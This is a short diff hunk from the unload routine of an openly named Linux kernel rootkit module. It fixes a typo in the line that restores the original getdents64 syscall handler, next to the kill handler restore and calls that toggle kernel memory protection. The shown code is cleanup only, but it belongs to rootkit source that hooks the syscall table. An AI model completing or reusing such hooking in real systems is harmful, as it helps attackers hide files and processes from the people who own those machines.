@@ -324,7 +324,7 @@ static void __exit rootkit_exit(void)
 	unprotect_memory();
 	printk(KERN_INFO "\t\t\t\t\t\t back to normal");
 
-	_sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
+	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
 	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;
 
 	protect_memory();
